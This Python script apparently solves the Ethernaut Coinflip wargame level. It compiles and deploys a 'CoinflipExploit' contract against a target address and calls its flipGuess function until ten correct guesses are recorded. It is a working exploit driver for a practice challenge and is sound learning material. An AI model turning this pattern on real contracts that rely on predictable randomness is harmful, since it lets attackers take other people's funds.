import web3
import solcx
from dotenv import load_dotenv
import os

load_dotenv()

# load variables from .env
wallet_private_key = os.getenv("WALLET_PRIVATE_KEY")
wallet_address = os.getenv("WALLET_ADDRESS")
w3 = web3.Web3(web3.HTTPProvider(os.getenv("WEB3_PROVIDER")))

contract_address = "0xCONTRACTADDRESS"

# function to read contract source code, then return both the abi and bytecode
def read_source_return_abi_bytecode(contract_file, w3):
    with open(contract_file, "r") as f:
        contract_source = f.read()
        f.close()

    # install solc version 0.8.0 in case it's not installed.
    solcx.install_solc("0.8.0")
    solcx.set_solc_version("0.8.0")
    compiled_sol = solcx.compile_source(contract_source)

    # get abi and bytecode from our exploit contract, <stdin> is the placeholder for the file name we chose.
    abi = compiled_sol["<stdin>:CoinflipExploit"]["abi"]
    bytecode = compiled_sol["<stdin>:CoinflipExploit"]["bin"]

    return (abi, bytecode)

# function to send a transaction and return a receipt
def sign_and_send_transaction(w3, wallet_private_key, tx):
    signed_tx = w3.eth.account.sign_transaction(tx, wallet_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    return tx_receipt

def main():
    # read abi and bytecode from CoinflipExploit.sol
    (coinflip_exploit_abi, coinflip_exploit_bytecode) = read_source_return_abi_bytecode("./CoinflipExploit.sol", w3)
    
    # initialize contract object
    exploit_contract = w3.eth.contract(abi=coinflip_exploit_abi, bytecode=coinflip_exploit_bytecode)

    # build contract deployment transaction
    exploit_contract_deploy_fields = exploit_contract.constructor(contract_address).build_transaction({
        "nonce": w3.eth.get_transaction_count(wallet_address, "pending"),
        "gas": 400_000,
        "gasPrice": w3.to_wei("10", "gwei")
    })

    print("Attempting to deploy contract...")

    exploit_contract_deploy_receipt = sign_and_send_transaction(w3, wallet_private_key, exploit_contract_deploy_fields)

    # check if our transaction was successful
    if exploit_contract_deploy_receipt["status"] == 1:
        exploit_contract_address = exploit_contract_deploy_receipt.contractAddress
        print(f"Contract deployed at address: {exploit_contract_address}")
    else:
        print("Failed to deploy contract.")
        exit(1)

    exploit_contract_instance = w3.eth.contract(address=exploit_contract_address, abi=coinflip_exploit_abi)

    correct_guesses = 0

    while True:
        guess_tx_fields = {
            "nonce": w3.eth.get_transaction_count(wallet_address, "pending"),
            "gas": 100_000,
            "gasPrice": w3.to_wei("5", "gwei"),
        }

        flip_guess_tx = exploit_contract_instance.functions.flipGuess().build_transaction(guess_tx_fields)
        flip_guess_receipt = sign_and_send_transaction(w3, wallet_private_key, flip_guess_tx)

        if flip_guess_receipt["status"] == 1:
            print("Guess submitted successfully.")
            correct_guesses += 1
        else:
            print("Guess failed to submit.")

        if correct_guesses == 10:
            print("Level complete! Try submitting on Ethernaut.")
            break

if __name__ == "__main__":
    main()
